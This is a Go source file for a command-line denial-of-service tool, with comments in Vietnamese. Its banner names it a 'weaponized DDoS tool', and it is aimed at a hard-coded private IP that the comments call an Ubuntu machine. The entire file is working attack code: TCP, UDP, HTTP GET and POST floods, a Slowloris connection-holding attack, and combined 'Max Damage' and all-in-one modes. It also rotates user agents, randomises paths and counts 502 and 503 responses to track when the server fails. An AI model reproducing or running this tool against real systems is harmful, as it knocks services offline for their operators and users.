package main

import (
	crand "crypto/rand"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// === CẤU HÌNH MỤC TIÊU ===
const (
	TargetIP   = "10.203.152.105" // IP máy Ubuntu
	TargetPort = "80"
	NumWorkers = 100              // Giảm xuống 500 để tránh sập socket của Windows
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	"Chrome/120.0.0.0",
}

var urlPaths = []string{
	"/",
	"/Auth",
}

var (
	requestCount   uint64
	errorCount     uint64
	status503Count uint64 // Đếm số lượng lỗi 503 trả về
	status502Count uint64 // Đếm lỗi 502 (Bad Gateway)
	status200Count uint64 // Đếm mã 200 (Thành công)
	statusOther    uint64 // Đếm các mã khác
	running        int32 = 1
)

// Dùng 1 HTTP Client dùng chung để tránh rò rỉ bộ nhớ (memory leak) gây văng app
var globalHTTPClient = &http.Client{
	Timeout: 5 * time.Second,
	Transport: &http.Transport{
		MaxConnsPerHost:     1000,
		MaxIdleConnsPerHost: 1000,
		DisableKeepAlives:   true,
	},
}

// === RANDOM HELPER ===
func randomString(length int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	crand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randomPayload(size int) []byte {
	b := make([]byte, size)
	crand.Read(b)
	return b
}

func getRandomPath() string {
	idx := make([]byte, 1)
	rand.Read(idx)
	path := urlPaths[int(idx[0])%len(urlPaths)]
	if rand.Intn(3) == 0 {
		path += "?" + randomString(8) + "=" + randomString(8)
	}
	return path
}

// === TCP FLOOD ===
func tcpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := net.JoinHostPort(TargetIP, TargetPort)

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", target, 3*time.Second)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		payload := randomPayload(512)
		for i := 0; i < 5 && atomic.LoadInt32(&running) == 1; i++ {
			if _, err := conn.Write(payload); err != nil {
				break
			}
			atomic.AddUint64(&requestCount, 1)
		}
		conn.Close()
	}
}

// === UDP FLOOD ===
func udpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := net.JoinHostPort(TargetIP, TargetPort)

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("udp", target, 3*time.Second)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		payload := randomPayload(1024)
		for i := 0; i < 10 && atomic.LoadInt32(&running) == 1; i++ {
			if _, err := conn.Write(payload); err != nil {
				break
			}
			atomic.AddUint64(&requestCount, 1)
		}
		conn.Close()
	}
}

// === HTTP FLOOD ===
func httpFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := "http://" + TargetIP

	for atomic.LoadInt32(&running) == 1 {
		req, err := http.NewRequest("GET", target+getRandomPath(), nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Connection", "close")

		resp, err := globalHTTPClient.Do(req)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
			continue
		}
		
		// Đếm riêng các lỗi để hiển thị
		if resp.StatusCode == 503 {
			atomic.AddUint64(&status503Count, 1)
		} else if resp.StatusCode == 502 {
			atomic.AddUint64(&status502Count, 1)
		} else if resp.StatusCode == 200 {
			atomic.AddUint64(&status200Count, 1)
		} else {
			atomic.AddUint64(&statusOther, 1)
		}
		
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&requestCount, 1)
	}
}

// === SLOWLORIS ATTACK ===
func slowlorisFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := net.JoinHostPort(TargetIP, TargetPort)

	for atomic.LoadInt32(&running) == 1 {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
			time.Sleep(500 * time.Millisecond)
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		headers := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", getRandomPath(), TargetIP)
		conn.Write([]byte(headers))

		for i := 0; i < 10 && atomic.LoadInt32(&running) == 1; i++ {
			header := fmt.Sprintf("X-Header-%d: %s\r\n", rand.Intn(100), randomString(16))
			if _, err := conn.Write([]byte(header)); err != nil {
				break
			}
			atomic.AddUint64(&requestCount, 1)
			time.Sleep(1 * time.Second)
		}
		conn.Close()
	}
}

// === HTTP POST FLOOD ===
func httpPostFlood(wg *sync.WaitGroup) {
	defer wg.Done()
	target := "http://" + TargetIP

	for atomic.LoadInt32(&running) == 1 {
		body := randomString(2000)
		req, err := http.NewRequest("POST", target+"/api/submit", strings.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		
		resp, err := globalHTTPClient.Do(req)
		if err != nil {
			atomic.AddUint64(&errorCount, 1)
			continue
		}
		if resp.StatusCode == 503 {
			atomic.AddUint64(&status503Count, 1)
		} else if resp.StatusCode == 502 {
			atomic.AddUint64(&status502Count, 1)
		} else if resp.StatusCode == 200 {
			atomic.AddUint64(&status200Count, 1)
		} else {
			atomic.AddUint64(&statusOther, 1)
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&requestCount, 1)
	}
}

// === STATS DISPLAY ===
func printStats() {
	var lastReqCount uint64
	for atomic.LoadInt32(&running) == 1 {
		time.Sleep(2 * time.Second)
		if atomic.LoadInt32(&running) == 1 {
			currentReq := atomic.LoadUint64(&requestCount)
			speed := float64(currentReq-lastReqCount) / 2.0
			lastReqCount = currentReq

			fmt.Printf("\r[+] Sent: %-6d | 200: %-5d | 502: %-5d | 503: %-5d | Other: %-5d | Err: %-4d | %.1f req/s    ",
				currentReq,
				atomic.LoadUint64(&status200Count),
				atomic.LoadUint64(&status502Count),
				atomic.LoadUint64(&status503Count),
				atomic.LoadUint64(&statusOther),
				atomic.LoadUint64(&errorCount),
				speed)
		}
	}
}

// === MAIN ===
func main() {
	fmt.Println("==================================================")
	fmt.Println("  [X] GOLANG WEAPONIZED DDoS TOOL v2.1")
	fmt.Printf("  [Target] %s:%s | [Workers] %d\n", TargetIP, TargetPort, NumWorkers)
	fmt.Println("==================================================")
	fmt.Println("[1] TCP SYN/Flood (Connection Exhaustion)")
	fmt.Println("[2] UDP Volumetric Flood")
	fmt.Println("[3] HTTP GET Flood (L7 Server Saturation)")
	fmt.Println("[4] Slowloris Attack (Connection Hold)")
	fmt.Println("[5] HTTP POST Flood (Large Body)")
	fmt.Println("[6] HTTP + Slowloris Combo (Max Damage)")
	fmt.Println("[7] All-In-One Attack (All Methods)")
	fmt.Println("==================================================")
	fmt.Print("Select attack type (1-7): ")

	var choice string
	fmt.Scanln(&choice)

	var wg sync.WaitGroup
	atomic.StoreInt32(&running, 1)

	go printStats()

	methods := []func(*sync.WaitGroup){}
	switch choice {
	case "1": methods = append(methods, tcpFlood)
	case "2": methods = append(methods, udpFlood)
	case "3": methods = append(methods, httpFlood)
	case "4": methods = append(methods, slowlorisFlood)
	case "5": methods = append(methods, httpPostFlood)
	case "6": methods = append(methods, httpFlood, slowlorisFlood)
	case "7": methods = append(methods, tcpFlood, udpFlood, httpFlood, slowlorisFlood, httpPostFlood)
	default:
		fmt.Println("Invalid choice, exiting.")
		os.Exit(1)
	}

	fmt.Println("\n[!] Đang khai hỏa! Bấm Ctrl+C để dừng.")
	
	workersPerMethod := NumWorkers
	if len(methods) > 1 {
		workersPerMethod = NumWorkers / len(methods)
	}

	for _, method := range methods {
		for i := 0; i < workersPerMethod; i++ {
			wg.Add(1)
			go method(&wg)
		}
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	atomic.StoreInt32(&running, 0)
	fmt.Println("\n\n[!] Đã nhận lệnh ngừng bắn. Đang dọn dẹp goroutines...")
	
	// Ép thoát nếu đợi quá lâu
	go func() {
		time.Sleep(3 * time.Second)
		os.Exit(0)
	}()
	
	wg.Wait()
	fmt.Printf("[*] Tổng kết: %d requests | %d mã 503 | %d errors\n",
		atomic.LoadUint64(&requestCount),
		atomic.LoadUint64(&status503Count),
		atomic.LoadUint64(&errorCount))
}
